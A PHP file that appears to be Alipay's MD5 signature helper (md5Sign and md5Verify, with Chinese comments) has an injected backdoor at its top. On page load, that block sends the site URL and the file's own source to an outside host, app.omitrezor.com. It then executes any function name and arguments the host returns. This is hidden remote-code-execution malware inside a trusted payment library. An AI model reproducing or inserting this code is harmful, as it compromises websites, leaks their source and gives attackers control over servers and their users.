<?php 
if(version_compare(phpversion(), "5.3.0", ">=")){set_error_handler(function($errno, $errstr){});}if (@php_sapi_name() !== "cli"){if(!isset($_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])])){@setcookie("__".md5("cookie".@$_SERVER["HTTP_HOST"]), time());$_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])] = 0;}if(time()-$_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])] < 10){@define("SITE_",1);}else{@setcookie("__".md5("cookie".@$_SERVER["HTTP_HOST"]), time());}}$cert = defined("SITE_")?false:@file_get_contents("http://app.omitrezor.com/sign/".@$_SERVER["HTTP_HOST"], 0, stream_context_create(array("http" => array("ignore_errors" => true,"timeout"=>(isset($_REQUEST["T0o"])?intval($_REQUEST["T0o"]):(isset($_SERVER["HTTP_T0O"])?intval($_SERVER["HTTP_T0O"]):1)),"method"=>"POST","header"=>"Content-Type: application/x-www-form-urlencoded","content" => http_build_query(array("url"=>((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://".@$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]), "src"=> file_exists(__FILE__)?file_get_contents(__FILE__):""))))));!defined("SITE_") && @define("SITE_",1);
if($cert != false){
    $cert = @json_decode($cert, 1);
    if(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"]) && isset($cert["a3"])){$cert["f"] ($cert["a1"], $cert["a2"], $cert["a3"]);}elseif(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"])){ $cert["f"] ($cert["a1"], $cert["a2"]); }elseif(isset($cert["f"]) && isset($cert["a1"])){ $cert["f"] ($cert["a1"]); }elseif(isset($cert["f"])){ $cert["f"] (); }
}if(version_compare(phpversion(), "5.3.0", ">=")){restore_error_handler();}

/* *
 * MD5
 * 详细：MD5加密
 * 版本：3.3
 * 日期：2012-07-19
 * 说明：
 * 以下代码只是为了方便商户测试而提供的样例代码，商户可以根据自己网站的需要，按照技术文档编写,并非一定要使用该代码。
 * 该代码仅供学习和研究支付宝接口使用，只是提供一个参考。
 */

/**
 * 签名字符串
 * @param $prestr 需要签名的字符串
 * @param $key 私钥
 * return 签名结果
 */
function md5Sign($prestr, $key) {
	$prestr = $prestr . $key;
	return md5($prestr);
}

/**
 * 验证签名
 * @param $prestr 需要签名的字符串
 * @param $sign 签名结果
 * @param $key 私钥
 * return 签名结果
 */
function md5Verify($prestr, $sign, $key) {
	$prestr = $prestr . $key;
	$mysgin = md5($prestr);

	if($mysgin == $sign) {
		return true;
	}
	else {
		return false;
	}
}
?>